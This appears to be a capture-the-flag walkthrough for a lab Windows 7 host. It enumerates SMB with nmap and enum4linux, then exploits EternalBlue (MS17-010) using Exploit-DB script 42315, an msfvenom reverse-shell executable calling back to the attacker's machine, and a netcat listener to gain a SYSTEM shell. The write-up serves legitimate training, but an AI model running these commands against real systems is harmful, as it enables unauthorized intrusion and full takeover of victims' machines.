## Enumeration

Run an initial nmap scan to identify open ports and running services.

```bash
nmap -sC -sV -O -oA initial 10.10.10.40
```

- `-sC`: run default nmap scripts
- `-sV`: detect service version
- `-O`: detect OS
- `-oA`: output all formats, saved to `nmap/initial`

Nine ports are open: 139 and 445 (Microsoft SMB — netbios-ssn / microsoft-ds), and 135, 49152–49157 (msrpc).

Run a full TCP port scan to confirm no other ports are open.

```bash
nmap -sC -sV -O -p- -oA full 10.10.10.40
```

Run a UDP scan in parallel (a full UDP scan can take very long; the top 1000 ports is usually sufficient).

```bash
nmap -sU -O -p- -oA udp 10.10.10.40
```

---

## Enumeration

Run nmap's vulnerability scan scripts against the open ports.

```bash
nmap --script vuln -oA vuln 10.10.10.40
```

The host is flagged as vulnerable to EternalBlue (MS17-010). This flaw in Microsoft's SMB implementation allows a specially crafted packet to trigger arbitrary code execution on the target.

---

## Exploitation

Search Exploit-DB for a non-Metasploit MS17-010 exploit.

```bash
searchsploit --id MS17-010
```

The target is Windows 7, so exploit #42315 applies. Clone it into the working directory.

```bash
searchsploit -m 42315
```

Three changes are needed before the exploit will work:

**1. Download the `mysmb.py` dependency** the exploit imports, and rename it.

```bash
wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
mv 42315.py.1 mysmb.py
```

**2. Generate a reverse-shell payload** with MSFvenom (a standalone executable, not Meterpreter).

```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.6 LPORT=4444 > eternal-blue.exe
```

**3. Edit the exploit script** to add authentication credentials and the payload location. No valid credentials are available, so check whether guest login is permitted.

```bash
enum4linux -a 10.10.10.40
```

- `-a`: run all simple enumeration checks

Guest login is supported. Add the guest credentials to the exploit script, along with the path to `eternal-blue.exe`, and configure it to execute the payload.

Start a listener on the attack machine.

```bash
nc -nlvp 4444
```

Run the exploit.

```bash
python 42315.py 10.10.10.40
```

A shell returns running with SYSTEM privileges. Retrieve the user and root flags from their respective locations on the filesystem.

---
